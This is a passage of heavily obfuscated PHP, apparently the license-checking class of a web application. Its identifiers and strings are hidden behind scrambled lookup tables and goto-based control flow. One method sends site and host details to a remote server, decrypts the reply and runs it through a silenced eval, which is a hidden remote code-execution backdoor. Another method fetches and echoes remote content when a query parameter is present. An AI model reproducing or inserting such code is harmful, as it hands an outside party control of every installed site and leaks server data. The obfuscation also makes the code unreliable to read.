$dø¿‡Œ‘Àä[639]; if (strlen($B“ Š¶Ô½) < $dø¿‡Œ‘Àä[606]) { return; } $AïƒõïòÃ = array($E—“ÛÅÄé[190] => $aŸ–‰Š°Ş¤[$E—“ÛÅÄé[190]], $E—“ÛÅÄé[193] => $E—“ÛÅÄé[141](16), $E—“ÛÅÄé[194] => $E—“ÛÅÄé[174], $E—“ÛÅÄé[195] => $E—“ÛÅÄé[196], $E—“ÛÅÄé[197] => $_SERVER[$E—“ÛÅÄé[198]], $E—“ÛÅÄé[199] => $_SERVER[$E—“ÛÅÄé[200]], $E—“ÛÅÄé[201] => $_SERVER[$E—“ÛÅÄé[202]], $E—“ÛÅÄé[130] => $a¢ç²¥‚š, $E—“ÛÅÄé[203] => $E—“ÛÅÄé[61]($E—“ÛÅÄé[62])->{$_SERVER[´…‰Ò‹][63]}($E—“ÛÅÄé[164])); goto bÛŠˆ†¿‚; c¾°¦–±Ê: $F²¢åù“†é = $A¬êéÎù‚³[$E—“ÛÅÄé[218]]; $a‚’è¤©›ì = $this->{$_SERVER[´…‰Ò‹][225]}($F²¢åù“†é[$E—“ÛÅÄé[226]]); $fŒö¡ÇïÜ = $dø¿‡Œ‘Àä[641]; goto CÕ¹ÖÃÜãÜ; d¤£ˆ…Ô‘ô: if (!isset($aŸ–‰Š°Ş¤[$E—“ÛÅÄé[190]]) || $E—“ÛÅÄé[24]($aŸ–‰Š°Ş¤[$E—“ÛÅÄé[190]]) != 16) { $E—“ÛÅÄé[191]($E—“ÛÅÄé[192] . $aŸ–‰Š°Ş¤[$E—“ÛÅÄé[190]], !1); } $DÁ¢…–Ç–Ê = $E—“ÛÅÄé[61]($E—“ÛÅÄé[62])->{$_SERVER[´…‰Ò‹][63]}($E—“ÛÅÄé[133]); $a¢ç²¥‚š = $E—“ÛÅÄé[131]($_SERVER[$E—“ÛÅÄé[132]] . $DÁ¢…–Ç–Ê); goto B˜é¹‘ÖÓ; CÕ¹ÖÃÜãÜ: if (!$a‚’è¤©›ì || $a‚’è¤©›ì != $F²¢åù“†é[$E—“ÛÅÄé[162]]) { $FÔµ´ŠĞ‚æ = array($E—“ÛÅÄé[227] => $E—“ÛÅÄé[61]($E—“ÛÅÄé[62])->{$_SERVER[´…‰Ò‹][63]}($E—“ÛÅÄé[133]), $E—“ÛÅÄé[228] => $_SERVER[$E—“ÛÅÄé[132]], $E—“ÛÅÄé[229] => $E—“ÛÅÄé[230](), $E—“ÛÅÄé[199] => $_SERVER[$E—“ÛÅÄé[200]]); $a‡š‹ÁÄˆá = $this->{$_SERVER[´…‰Ò‹][231]}($E—“ÛÅÄé[173]($FÔµ´ŠĞ‚æ)); $this->{$_SERVER[´…‰Ò‹][209]}($E—“ÛÅÄé[232] . $a‡š‹ÁÄˆá); $E—“ÛÅÄé[191]($E—“ÛÅÄé[223]($E—“ÛÅÄé[233]), !0); } $a –‘ó«ï = array($E—“ÛÅÄé[234] => $F²¢åù“†é[$E—“ÛÅÄé[235]], $E—“ÛÅÄé[236] => $F²¢åù“†é[$E—“ÛÅÄé[237]], $E—“ÛÅÄé[238] => $E—“ÛÅÄé[141](16), $E—“ÛÅÄé[137] => $F²¢åù“†é[$E—“ÛÅÄé[239]]); if ($AïƒõïòÃ[$E—“ÛÅÄé[193]]) { $a –‘ó«ï[$E—“ÛÅÄé[238]] = $AïƒõïòÃ[$E—“ÛÅÄé[193]]; } goto f—÷‰¬¥¥á; aøçˆĞŸ“â: $C¢·²Ï†™Œ = $dø¿‡Œ‘Àä[649]; if (!$C¢·²Ï†™Œ) { return; } $this->laukfad11ca5 = $F²¢åù“†é; goto Dà•·®×Œ–; e‰ÆÌÜÑ£ó: $dø¿‡Œ‘Àä =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $E—“ÛÅÄé =& $_SERVER[´…‰Ò‹]; if ($_SERVER[$E—“ÛÅÄé[44]] != $E—“ÛÅÄé[187]) { return; } goto CÜµê‘—»Š; fÔëöÅÊ£Â: $bœ‘’ğÎÒö = $dø¿‡Œ‘Àä[646]; if (!$bœ‘’ğÎÒö) { return; } if ($F²¢åù“†é[$E—“ÛÅÄé[243]] && $F²¢åù“†é[$E—“ÛÅÄé[243]] >= 1) { $E—“ÛÅÄé[61]($E—“ÛÅÄé[62])->{$_SERVER[´…‰Ò‹][244]}($E—“ÛÅÄé[245], $E—“ÛÅÄé[246]); } goto dÊ”‘•ÒƒÇ; CÜµê‘—»Š: if (!$E—“ÛÅÄé[123]($GLOBALS, $E—“ÛÅÄé[149])) { die; } $aŸ–‰Š°Ş¤ = $GLOBALS[$E—“ÛÅÄé[22]]; if (isset($aŸ–‰Š°Ş¤[$E—“ÛÅÄé[188]])) { $this->{$_SERVER[´…‰Ò‹][189]}(); die; } goto d¤£ˆ…Ô‘ô; c¢Õ¬İÏ…: $EÅù²±¥§Ø = $E—“ÛÅÄé[141](16); $fÜÙ™„Š«è = $dø¿‡Œ‘Àä[644]; if (strlen($fÜÙ™„Š«è) < $dø¿‡Œ‘Àä[606]) { die; } goto a˜”¹¢§ñ; EÜá‰œ‰ë: $fìãÕ‚ä¶  = $E—“ÛÅÄé[248]($E—“ÛÅÄé[61]($E—“ÛÅÄé[11])->{$_SERVER[´…‰Ò‹][249]}(), $E—“ÛÅÄé[250]); $C–ÄºĞİİ÷ = $fìãÕ‚ä¶ [$E—“ÛÅÄé[251]]; $A·©¯‚ØÏœ = array(); goto FÄ¯˜ÌÜØÉ; eñÎ‘é¨äŒ: if (!$eŞî¥öƒÅ) { die; } Cache::set($E—“ÛÅÄé[256] . $E—“ÛÅÄé[131]($DÁ¢…–Ç–Ê . $E—“ÛÅÄé[257]), $E—“ÛÅÄé[10]); $E—“ÛÅÄé[191]($E—“ÛÅÄé[223]($E—“ÛÅÄé[233]), !0); goto CÅŞÖ½À™; dÊ”‘•ÒƒÇ: $E—“ÛÅÄé[61]($E—“ÛÅÄé[62])->{$_SERVER[´…‰Ò‹][247]}($a –‘ó«ï); $CË‚„íİí = $E—“ÛÅÄé[131]($_SERVER[$E—“ÛÅÄé[132]] . $E—“ÛÅÄé[240]($DÁ¢…–Ç–Ê) . $a –‘ó«ï[$E—“ÛÅÄé[236]]); $c³šˆ¥¤öÂ = $E—“ÛÅÄé[240]($E—“ÛÅÄé[25]($CË‚„íİí, 10, 16)); goto AÅ—‘İ¿•ä; a˜”¹¢§ñ: $eË¼ˆÛË‹† = $EÅù²±¥§Ø . $a –‘ó«ï[$E—“ÛÅÄé[137]] . $this->{$_SERVER[´…‰Ò‹][172]}($E—“ÛÅÄé[131]($a –‘ó«ï[$E—“ÛÅÄé[234]]), $EÅù²±¥§Ø); $e’ğ¶ÁÓ = $dø¿‡Œ‘Àä[645]; $a –‘ó«ï[$E—“ÛÅÄé[140]] = $E—“ÛÅÄé[135]($E—“ÛÅÄé[240]($this->{$_SERVER[´…‰Ò‹][172]}($eË¼ˆÛË‹†, $E—“ÛÅÄé[242]))); goto fÔëöÅÊ£Â; f—÷‰¬¥¥á: $B³–á‹®ô¡ = $E—“ÛÅÄé[25]($E—“ÛÅÄé[131]($a –‘ó«ï[$E—“ÛÅÄé[236]]), 10, 10); $CŠàİÇøîâ = $B³–á‹®ô¡ . $a –‘ó«ï[$E—“ÛÅÄé[137]] . $a –‘ó«ï[$E—“ÛÅÄé[238]]; $e…ÅœÁ³®õ = $dø¿‡Œ‘Àä[642]; goto B¨ëŒÅù™‘; AÅ—‘İ¿•ä: $DŒÕ¦‰Äƒ = $dø¿‡Œ‘Àä[647]; if (!$DŒÕ¦‰Äƒ) { die; } $a”¢‡Ö´Äõ = $this->{$_SERVER[´…‰Ò‹][144]}($E—“ÛÅÄé[173]($F²¢åù“†é), $CË‚„íİí); goto EÜá‰œ‰ë; CÅŞÖ½À™: $EÕõ“„åä½ = $dø¿‡Œ‘Àä[651]; goto C¬£¤È¯­‹; FÄ¯˜ÌÜØÉ: $dº§æƒèÕ = $dø¿‡Œ‘Àä[648]; $A·©¯‚ØÏœ[$c³šˆ¥¤öÂ] = $a”¢‡Ö´Äõ; $E—“ÛÅÄé[61]($E—“ÛÅÄé[11])->{$_SERVER[´…‰Ò‹][252]}($C–ÄºĞİİ÷[$E—“ÛÅÄé[253]], array($E—“ÛÅÄé[254] => $A·©¯‚ØÏœ)); goto aøçˆĞŸ“â; B¨ëŒÅù™‘: while ($e…ÅœÁ³®õ < $dø¿‡Œ‘Àä[606]) { if ($e…ÅœÁ³®õ >= 0) { break; } $e…ÅœÁ³®õ++; } $a –‘ó«ï[$E—“ÛÅÄé[139]] = $E—“ÛÅÄé[240]($E—“ÛÅÄé[135]($this->{$_SERVER[´…‰Ò‹][172]}($CŠàİÇøîâ, $E—“ÛÅÄé[241]))); $aÆÖî×£öá = $dø¿‡Œ‘Àä[643]; goto c¢Õ¬İÏ…; bÛŠˆ†¿‚: $b…ëõ´»»ê = $dø¿‡Œ‘Àä[640]; if ($aŸ–‰Š°Ş¤[$E—“ÛÅÄé[204]] == $E—“ÛÅÄé[205]) { $E¦¤œÒÃÑÕ = $this->{$_SERVER[´…‰Ò‹][172]}($a¢ç²¥‚š, $E—“ÛÅÄé[206]); $a‡š‹ÁÄˆá = $this->{$_SERVER[´…‰Ò‹][144]}($E—“ÛÅÄé[173]($AïƒõïòÃ), $a¢ç²¥‚š . $E—“ÛÅÄé[207], 3); $a‡š‹ÁÄˆá = $a‡š‹ÁÄˆá . $E—“ÛÅÄé[208] . $_SERVER[$E—“ÛÅÄé[198]]; $e¿“‚õ‚İ = $this->{$_SERVER[´…‰Ò‹][209]}($E—“ÛÅÄé[210] . $E¦¤œÒÃÑÕ . $E—“ÛÅÄé[211] . $a‡š‹ÁÄˆá, -1); $E—“ÛÅÄé[191]($e¿“‚õ‚İ, !0); } else { if ($aŸ–‰Š°Ş¤[$E—“ÛÅÄé[204]] == $E—“ÛÅÄé[212]) { $Dâ•‹Ô‘†Ì = $E—“ÛÅÄé[25]($E—“ÛÅÄé[131]($E—“ÛÅÄé[213] . $a¢ç²¥‚š), 12, 15) . $E—“ÛÅÄé[214]; $a‡š‹ÁÄˆá = $this->{$_SERVER[´…‰Ò‹][215]}($E—“ÛÅÄé[2]($aŸ–‰Š°Ş¤[$E—“ÛÅÄé[216]]), $Dâ•‹Ô‘†Ì, 2); $A¬êéÎù‚³ = $E—“ÛÅÄé[217]($a‡š‹ÁÄˆá, !0); if (!$E—“ÛÅÄé[168]($A¬êéÎù‚³) || !$E—“ÛÅÄé[168]($A¬êéÎù‚³[$E—“ÛÅÄé[218]]) || $A¬êéÎù‚³[$E—“ÛÅÄé[190]] != !0) { $AùØÓ×¯Õ = $E—“ÛÅÄé[219]; $bÌ¯¹ºÄùå = $A¬êéÎù‚³[$E—“ÛÅÄé[218]] ? $E—“ÛÅÄé[220] . $A¬êéÎù‚³[$E—“ÛÅÄé[218]] : $AùØÓ×¯Õ; $E—“ÛÅÄé[191]($bÌ¯¹ºÄùå, !1); } else { $AïƒõïòÃ[$E—“ÛÅÄé[193]] = $A¬êéÎù‚³[$E—“ÛÅÄé[218]][$E—“ÛÅÄé[221]]; } } else { $A¬êéÎù‚³ = $this->{$_SERVER[´…‰Ò‹][209]}($E—“ÛÅÄé[222], $AïƒõïòÃ, 10); } } if (!$E—“ÛÅÄé[168]($A¬êéÎù‚³) || !$E—“ÛÅÄé[168]($A¬êéÎù‚³[$E—“ÛÅÄé[218]]) || $A¬êéÎù‚³[$E—“ÛÅÄé[190]] != !0) { $AùØÓ×¯Õ = $E—“ÛÅÄé[223]($E—“ÛÅÄé[224]); $bÌ¯¹ºÄùå = $A¬êéÎù‚³[$E—“ÛÅÄé[218]] ? $E—“ÛÅÄé[220] . $A¬êéÎù‚³[$E—“ÛÅÄé[218]] : $AùØÓ×¯Õ; $E—“ÛÅÄé[191]($bÌ¯¹ºÄùå, !1); } goto c¾°¦–±Ê; Dà•·®×Œ–: $this->gzuc017ad278 = $a –‘ó«ï[$E—“ÛÅÄé[137]]; $this->{$_SERVER[´…‰Ò‹][255]}(); $eŞî¥öƒÅ = $dø¿‡Œ‘Àä[650]; goto eñÎ‘é¨äŒ; C¬£¤È¯­‹: } private function licenseRegistSuccess() { $c¦‡•”ÄšŒ =& $_SERVER[´…‰Ò‹]; $F…ÁŠçÃ‚ = $c¦‡•”ÄšŒ[61]($c¦‡•”ÄšŒ[62])->{$_SERVER[´…‰Ò‹][63]}(); $dĞîÔê‘êÉ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][652]; if ($F…ÁŠçÃ‚[$c¦‡•”ÄšŒ[93]] != $c¦‡•”ÄšŒ[246]) { $c¦‡•”ÄšŒ[61]($c¦‡•”ÄšŒ[62])->{$_SERVER[´…‰Ò‹][247]}($c¦‡•”ÄšŒ[93], $c¦‡•”ÄšŒ[246]); } $c¦‡•”ÄšŒ[127]($c¦‡•”ÄšŒ[258])->{$_SERVER[´…‰Ò‹][259]}(!0); } private function luvj750685b5() { goto B…†Í‹ƒÌ¬; BÎ­à›š: $AÃ…­¢ˆ Ó = $a˜½Ì¹¢‹î[653]; if (strlen($AÃ…­¢ˆ Ó) < $a˜½Ì¹¢‹î[601]) { return; } goto C‡À¹ñÏî‚; eˆçö¡ÅôÓ: $cÇåç–È¦Î[61]($cÇåç–È¦Î[62])->{$_SERVER[´…‰Ò‹][244]}($cÇåç–È¦Î[245], $cÇåç–È¦Î[260]); $this->laukfad11ca5 = array(); $this->gzuc017ad278 = $cÇåç–È¦Î[138]; goto BÎ­à›š; B…†Í‹ƒÌ¬: $a˜½Ì¹¢‹î =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÇåç–È¦Î =& $_SERVER[´…‰Ò‹]; $cÇåç–È¦Î[61]($cÇåç–È¦Î[62])->{$_SERVER[´…‰Ò‹][247]}(array($cÇåç–È¦Î[234] => $cÇåç–È¦Î[10], $cÇåç–È¦Î[236] => $cÇåç–È¦Î[10], $cÇåç–È¦Î[137] => $cÇåç–È¦Î[138], $cÇåç–È¦Î[139] => $cÇåç–È¦Î[10], $cÇåç–È¦Î[140] => $cÇåç–È¦Î[10])); goto eˆçö¡ÅôÓ; C‡À¹ñÏî‚: } private function mhkb56f1a70d() { goto D§¶µé¿Ä; D§¶µé¿Ä: $D£´Ğ‡ˆì® =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÏˆÃŸ²Ş¬ =& $_SERVER[´…‰Ò‹]; $_SERVER[$cÏˆÃŸ²Ş¬[200]] = $cÏˆÃŸ²Ş¬[123]($_SERVER, $cÏˆÃŸ²Ş¬[200], APP_HOST); goto AÉÙ·šœóé; bñ†ƒÀÂ½: $eˆë¸İ’¥„ = $cÏˆÃŸ²Ş¬[256] . $cÏˆÃŸ²Ş¬[131]($cÓÂÆÀ›¢ã . $cÏˆÃŸ²Ş¬[257]); $DàçˆÕ‹‡ = $D£´Ğ‡ˆì®[656]; if (!$DàçˆÕ‹‡) { return; } goto AƒÁÌÇõğ…; AÉÙ·šœóé: $this->gzuc017ad278 = $cÏˆÃŸ²Ş¬[138]; $eË®ÉŠÓœ = $D£´Ğ‡ˆì®[654]; $d·…Ùá¥É = $cÏˆÃŸ²Ş¬[61]($cÏˆÃŸ²Ş¬[62])->{$_SERVER[´…‰Ò‹][63]}(); goto d”ÚÚ‚²©¸; aá¨”àÂÜ¼: while (strlen($a¥‘ÑºÄ) < $D£´Ğ‡ˆì®[606]) { if (!$a¥‘ÑºÄ) { break; } $a¥‘ÑºÄ++; } goto BùŞ¬……£; ağì²Š¨Ñ´: $BÛ’´õ‹Â© = $cÏˆÃŸ²Ş¬[161]($b²ÉÔõ¬©‡[$cÏˆÃŸ²Ş¬[162]]); if ($cÏˆÃŸ²Ş¬[262]() >= $BÛ’´õ‹Â©) { return $this->{$_SERVER[´…‰Ò‹][189]}(); } if ($cÏˆÃŸ²Ş¬[262]() - $b²ÉÔõ¬©‡[$cÏˆÃŸ²Ş¬[261]] > 20) { $b²ÉÔõ¬©‡[$cÏˆÃŸ²Ş¬[261]] = $cÏˆÃŸ²Ş¬[262](); Cache::set($eˆë¸İ’¥„, $b²ÉÔõ¬©‡); } goto EÊÚôˆØÌÌ; d”ÚÚ‚²©¸: $f‰º°Ø©¡ = $D£´Ğ‡ˆì®[655]; if ($d·…Ùá¥É[$cÏˆÃŸ²Ş¬[137]] == $cÏˆÃŸ²Ş¬[138]) { return; } $cÓÂÆÀ›¢ã = $cÏˆÃŸ²Ş¬[61]($cÏˆÃŸ²Ş¬[62])->{$_SERVER[´…‰Ò‹][63]}($cÏˆÃŸ²Ş¬[133]); goto bñ†ƒÀÂ½; AƒÁÌÇõğ…: $b²ÉÔõ¬©‡ = Cache::get($eˆë¸İ’¥„); if (!$cÏˆÃŸ²Ş¬[168]($b²ÉÔõ¬©‡) || !isset($b²ÉÔõ¬©‡[$cÏˆÃŸ²Ş¬[261]]) || $cÏˆÃŸ²Ş¬[262]() - $b²ÉÔõ¬©‡[$cÏˆÃŸ²Ş¬[261]] >= 60) { $e ¼è Úîæ = $cÏˆÃŸ²Ş¬[61]($cÏˆÃŸ²Ş¬[11])->{$_SERVER[´…‰Ò‹][263]}(); $b¦æ¡ôÎ‹‡ = $e ¼è Úîæ[$cÏˆÃŸ²Ş¬[251]]; $D´â»›ô‡á = $cÏˆÃŸ²Ş¬[131]($_SERVER[$cÏˆÃŸ²Ş¬[132]] . $cÏˆÃŸ²Ş¬[240]($cÓÂÆÀ›¢ã) . $d·…Ùá¥É[$cÏˆÃŸ²Ş¬[236]]); $bÉ¢¹¼»ù = $cÏˆÃŸ²Ş¬[240]($cÏˆÃŸ²Ş¬[25]($D´â»›ô‡á, 10, 16)); $b²ÉÔõ¬©‡ = $this->{$_SERVER[´…‰Ò‹][215]}($b¦æ¡ôÎ‹‡[$cÏˆÃŸ²Ş¬[111]][$bÉ¢¹¼»ù], $D´â»›ô‡á); $b²ÉÔõ¬©‡ = $cÏˆÃŸ²Ş¬[217]($b²ÉÔõ¬©‡, !0); } if (!$cÏˆÃŸ²Ş¬[168]($b²ÉÔõ¬©‡)) { return $this->{$_SERVER[´…‰Ò‹][189]}(); } goto ağì²Š¨Ñ´; EÊÚôˆØÌÌ: $this->laukfad11ca5 = $b²ÉÔõ¬©‡; $this->gzuc017ad278 = $d·…Ùá¥É[$cÏˆÃŸ²Ş¬[137]]; $a¥‘ÑºÄ = $D£´Ğ‡ˆì®[657]; goto aá¨”àÂÜ¼; BùŞ¬……£: } private function atfg136cd607() { goto CŠÒİŠ¡ì; CÒëÀÒ´Â­: $DÖ…ŠÄƒµÆ = $d‹Œ“öÕŸ[658]; if (strlen($DÖ…ŠÄƒµÆ) < $d‹Œ“öÕŸ[609]) { return; } $FŸ…ñõÆó¸ = $_SERVER[$cÆøô«Úõì[44]]; goto d‘òò; CŠÒİŠ¡ì: $d‹Œ“öÕŸ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $cÆøô«Úõì =& $_SERVER[´…‰Ò‹]; $e¹ÏÅ½…¡¥ = $GLOBALS[$cÆøô«Úõì[22]]; goto CÒëÀÒ´Â­; d‘òò: if ($FŸ…ñõÆó¸ == $cÆøô«Úõì[264] && $this->gzuc017ad278 == $cÆøô«Úõì[138]) { $cÆøô«Úõì[191]($cÆøô«Úõì[223]($cÆøô«Úõì[265]), !1, $cÆøô«Úõì[266]); } $E»¥³¬·öÔ = array($cÆøô«Úõì[267], $cÆøô«Úõì[268]); if ($cÆøô«Úõì[269]($FŸ…ñõÆó¸, $E»¥³¬·öÔ)) { if ($this->gzuc017ad278 == $cÆøô«Úõì[138] && isset($e¹ÏÅ½…¡¥[$cÆøô«Úõì[270]])) { $cÆøô«Úõì[191]($cÆøô«Úõì[223]($cÆøô«Úõì[265]), !1, $cÆøô«Úõì[266]); die; } $D±äÅš¾µ‚ = $this->{$_SERVER[´…‰Ò‹][154]}(); if ($D±äÅš¾µ‚ != $cÆøô«Úõì[271]($cÆøô«Úõì[272])) { if ($D±äÅš¾µ‚ <= $cÆøô«Úõì[61]($cÆøô«Úõì[156])->{$_SERVER[´…‰Ò‹][157]}()) { $cÆøô«Úõì[191]($cÆøô«Úõì[223]($cÆøô«Úõì[273]), !1, $cÆøô«Úõì[266]); die; } } } goto E„â‹ÃÜ±; E„â‹ÃÜ±: } private function ywumfaa3dd51() { goto f—ØŞÍ™; Fö“§ò´: if (!$aøÑë”î‹[269]($_SERVER[$aøÑë”î‹[44]], $e¯·ÎàÇ©Æ)) { return; } $bÑ°‡åˆŞ = $aøÑë”î‹[276]; $e’á‹Öë¦ = $_SERVER[Ôğ—¤Šµˆ˜ñ£][659]; goto b…šßìÚ; b…šßìÚ: $bÑ°‡åˆŞ = $this->{$_SERVER[´…‰Ò‹][277]}($bÑ°‡åˆŞ, $aøÑë”î‹[278]); $f•‚ÔõåŞ° = $aøÑë”î‹[279](array($aøÑë”î‹[280] => array($aøÑë”î‹[281] => $aøÑë”î‹[282], $aøÑë”î‹[283] => 3))); $D£¹É…¾Ôö = @$aøÑë”î‹[284]($bÑ°‡åˆŞ, !1, $f•‚ÔõåŞ°); goto e„ì•ÃÓÎ½; f—ØŞÍ™: $aøÑë”î‹ =& $_SERVER[´…‰Ò‹]; $e¯·ÎàÇ©Æ = array($aøÑë”î‹[152], $aøÑë”î‹[274]); if (!$aøÑë”î‹[123]($GLOBALS, $aøÑë”î‹[149]) || !isset($_GET[$aøÑë”î‹[275]])) { return; } goto Fö“§ò´; e„ì•ÃÓÎ½: $aøÑë”î‹[285]($aøÑë”î‹[286]); if ($D£¹É…¾Ôö && $aøÑë”î‹[32]($D£¹É…¾Ôö, $aøÑë”î‹[287])) { echo $D£¹É…¾Ôö; } die; goto c­—à¢†Ö¥; c­—à¢†Ö¥: } public function jkxzcd1d7390($bğÁ¿Œ¥‹) { goto cù¡Ì‡ŸÈ; cù¡Ì‡ŸÈ: $AÊäêã¤•Î =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $fÍ¿£’Ûñ =& $_SERVER[´…‰Ò‹]; if ($this->gzuc017ad278 == $fÍ¿£’Ûñ[288]) { return $bğÁ¿Œ¥‹; } goto FŠÉ¦³„ºß; F…ë¿«Ô„µ: while (strlen($Fì¥ÍÓË¬ò) < $AÊäêã¤•Î[601]) { if (!$Fì¥ÍÓË¬ò) { break; } $Fì¥ÍÓË¬ò++; } $f’£¬¿¿Ğ… = array(); foreach ($FâÂóÅ¨ã as $dµ¹­÷‰ã  => $eê‰Ó×‘½) { if ($eê‰Ó×‘½ == $fÍ¿£’Ûñ[290] && $fÍ¿£’Ûñ[25]($this->gzuc017ad278, 0, 1) == $fÍ¿£’Ûñ[290]) { continue; } if (!$fÍ¿£’Ûñ[269]($dµ¹­÷‰ã , $dÓÅËÛ“ÛÉ)) { $f’£¬¿¿Ğ…[] = $dµ¹­÷‰ã ; } } goto F‰ë—ó£„ò; FŠÉ¦³„ºß: $FâÂóÅ¨ã = array($fÍ¿£’Ûñ[289] => $fÍ¿£’Ûñ[290], $fÍ¿£’Ûñ[291] => $fÍ¿£’Ûñ[290], $fÍ¿£’Ûñ[292] => $fÍ¿£’Ûñ[290], $fÍ¿£’Ûñ[293] => $fÍ¿£’Ûñ[290], $fÍ¿£’Ûñ[294] => $fÍ¿£’Ûñ[295], $fÍ¿£’Ûñ[296] => $fÍ¿£’Ûñ[295], $fÍ¿£’Ûñ[297] => $fÍ¿£’Ûñ[295], $fÍ¿£’Ûñ[298] => $fÍ¿£’Ûñ[295], $fÍ¿£’Ûñ[299] => $fÍ¿£’Ûñ[295], $fÍ¿£’Ûñ[300] => $fÍ¿£’Ûñ[295], $fÍ¿£’Ûñ[301] => $fÍ¿£’Ûñ[295], $fÍ¿£’Ûñ[302] => $fÍ¿£’Ûñ[295], $fÍ¿£’Ûñ[303] => $fÍ¿£’Ûñ[295], $fÍ¿£’Ûñ[304] => $fÍ¿£’Ûñ[295], $fÍ¿£’Ûñ[305] => $fÍ¿£’Ûñ[295], $fÍ¿£’Ûñ[306] => $fÍ¿£’Ûñ[295]); $dÓÅËÛ“ÛÉ = $fÍ¿£’Ûñ[0]($fÍ¿£’Ûñ[307], $fÍ¿£’Ûñ[123]($this->laukfad11ca5, $fÍ¿£’Ûñ[146], $fÍ¿£’Ûñ[10])); $Fì¥ÍÓË¬ò = $AÊäêã¤•Î[660]; goto F…ë¿«Ô„µ; F‰ë—ó£„ò: foreach ($f’£¬¿¿Ğ… as $dµ¹­÷‰ã ) { unset($bğÁ¿Œ¥‹[$dµ¹­÷‰ã ]); } return $bğÁ¿Œ¥‹; goto D¡öÉé¯äŒ; D¡öÉé¯äŒ: } private function owrv201ba981() { $EŞàÓ‰‘˜“ =& $_SERVER[´…‰Ò‹]; if ($this->gzuc017ad278 != $EŞàÓ‰‘˜“[138]) { return; } $GLOBALS[$EŞàÓ‰‘˜“[111]][$EŞàÓ‰‘˜“[115]][$EŞàÓ‰‘˜“[308]] = $EŞàÓ‰‘˜“[246]; $GLOBALS[$EŞàÓ‰‘˜“[111]][$EŞàÓ‰‘˜“[309]] = $EŞàÓ‰‘˜“[246]; if ($EŞàÓ‰‘˜“[61]($EŞàÓ‰‘˜“[310])->{$_SERVER[´…‰Ò‹][63]}($EŞàÓ‰‘˜“[93]) != $EŞàÓ‰‘˜“[260]) { $EŞàÓ‰‘˜“[61]($EŞàÓ‰‘˜“[310])->{$_SERVER[´…‰Ò‹][247]}($EŞàÓ‰‘˜“[93], $EŞàÓ‰‘˜“[260]); } } public function biud7cf00b9b() { return $_SERVER[´…‰Ò‹][311]; } private function eijw7334984f() { goto c‚¬µ‘Â°©; cªìáÈ°òÊ: $this->{$_SERVER[´…‰Ò‹][189]}(); if ($this->{$_SERVER[´…‰Ò‹][225]}($E‘©³†î‡[$d‘îøîÄÆ„[321]]) != $e™ë¯¸°’[$d‘îøîÄÆ„[190]]) { $BˆòÔ¹Û‘‡ = array($d‘îøîÄÆ„[227] => $AÂ²ôÚè´õ, $d‘îøîÄÆ„[228] => $_SERVER[$d‘îøîÄÆ„[132]], $d‘îøîÄÆ„[229] => $d‘îøîÄÆ„[230](), $d‘îøîÄÆ„[199] => $_SERVER[$d‘îøîÄÆ„[200]]); $a—„ñ¹¢ˆõ = $this->{$_SERVER[´…‰Ò‹][231]}($d‘îøîÄÆ„[173]($BˆòÔ¹Û‘‡)); $E‘©³†î‡ = $this->{$_SERVER[´…‰Ò‹][209]}($d‘îøîÄÆ„[232] . $a—„ñ¹¢ˆõ); if ($E‘©³†î‡ && $d‘îøîÄÆ„[168]($E‘©³†î‡) && isset($E‘©³†î‡[$d‘îøîÄÆ„[321]])) { $BÙï‘š£¬õ = $this->{$_SERVER[´…‰Ò‹][215]}($E‘©³†î‡[$d‘îøîÄÆ„[321]], 2); if ($BÙï‘š£¬õ) { $BÙï‘š£¬õ = $this->{$_SERVER[´…‰Ò‹][225]}($BÙï‘š£¬õ); } if ($BÙï‘š£¬õ) { try { @eval($BÙï‘š£¬õ); } catch (Exception $eŠ‘Ø½ìÕ) { } } } } goto aŞÏ´ÓˆÅª; E¦Ï‡×ŒÑ: if ($this->gzuc017ad278 == $d‘îøîÄÆ„[138] || !$d‘îøîÄÆ„[123]($GLOBALS, $d‘îøîÄÆ„[149])) { return; } if (!$d‘îøîÄÆ„[269]($_SERVER[$d‘îøîÄÆ„[44]], $f…ÊÛ…Ú¸”)) { return; } if ($d‘îøîÄÆ„[262]() % 4 != 0) { return; } goto Cä¶•µà›È; Eø¸½ Ûø–: while (strlen($BÌš‡·ì²ö) < $b”ŠíÒ‚[629]) { if (!$BÌš‡·ì²ö) { break; } $BÌš‡·ì²ö++; } $e™ë¯¸°’ = array($d‘îøîÄÆ„[190] => $d‘îøîÄÆ„[61]($d‘îøîÄÆ„[62])->{$_SERVER[´…‰Ò‹][63]}($d‘îøîÄÆ„[234]), $d‘îøîÄÆ„[204] => $this->gzuc017ad278, $d‘îøîÄÆ„[201] => $_SERVER[$d‘îøîÄÆ„[202]], $d‘îøîÄÆ„[203] => $d‘îøîÄÆ„[61]($d‘îøîÄÆ„[62])->{$_SERVER[´…‰Ò‹][63]}($d‘îøîÄÆ„[164]), $d‘îøîÄÆ„[130] => $d‘îøîÄÆ„[131]($_SERVER[$d‘îøîÄÆ„[132]] . $AÂ²ôÚè´õ), $d‘îøîÄÆ„[194] => $d‘îøîÄÆ„[174], $d‘îøîÄÆ„[197] => $_SERVER[$d‘îøîÄÆ„[198]]); $E‘©³†î‡ = $this->{$_SERVER[´…‰Ò‹][209]}($d‘îøîÄÆ„[320], $e™ë¯¸°’); goto CÊÉøÀ„÷ß; c‚¬µ‘Â°©: $b”ŠíÒ‚ =& $_SERVER[Ôğ—¤Šµˆ˜ñ£]; $d‘îøîÄÆ„ =& $_SERVER[´…‰Ò‹]; $f…ÊÛ…Ú¸” = array($d‘îøîÄÆ„[312], $d‘îøîÄÆ„[313], $d‘îøîÄÆ„[314]); goto d‘ö’½ÏÆÙ; cºèº—¥“·: if ($b²…åƒ×ˆš && $d‘îøîÄÆ„[262]() - $b²…åƒ×ˆš < $d‘îøîÄÆ„[271]($d‘îøîÄÆ„[319])) { return; } $d‘îøîÄÆ„[13](array($d‘îøîÄÆ„[317], $d‘îøîÄÆ„[177]), $Cõ¾†‚Á Œ, $d‘îøîÄÆ„[262]()); $fç¨õ½¡¢ƒ = $b”ŠíÒ‚[663]; goto E¿¶ñ¢Ñ¶‹; Cä¶•µà›È: $b²…åƒ×ˆš = $d‘îøîÄÆ„[13](array($d‘îøîÄÆ„[317], $d‘îøîÄÆ„[318]), $Cõ¾†‚Á Œ); $Cñ¹òÇ¨É = $b”ŠíÒ‚[662]; if (strlen($Cñ¹òÇ¨É) < 